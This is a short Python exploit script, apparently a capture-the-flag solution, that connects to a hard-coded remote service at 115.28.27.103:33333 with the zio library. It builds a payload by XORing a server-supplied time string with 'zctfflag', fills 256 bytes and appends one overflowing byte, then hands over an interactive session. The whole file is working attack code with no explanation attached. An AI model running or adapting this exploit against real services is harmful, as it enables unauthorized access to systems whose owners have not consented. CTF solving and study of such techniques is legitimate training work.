from zio import *

target = ("115.28.27.103", 33333)

def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")
	io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	#io = process(target, timeout = 9999)
	return  io

def pwn(io):

	io.read_until("How long of your spell:")
	io.writeline("256")
	io.read_until("At ")
	time_info = io.read_until(": ")
	io.read_until("you enter the spell: ")

	time_info = time_info + "\x00"
	info = "zctfflag"
	result = []

	padding = ""
	for i in range(8):
		padding += chr(ord(time_info[i]) ^ ord(info[i]))

	payload = padding * 7
	payload += "\x00"
	payload = payload.ljust(256, 'a')
	payload += '\x02'

	io.writeline(payload)
	io.interact()

io = get_io(target)
pwn(io)

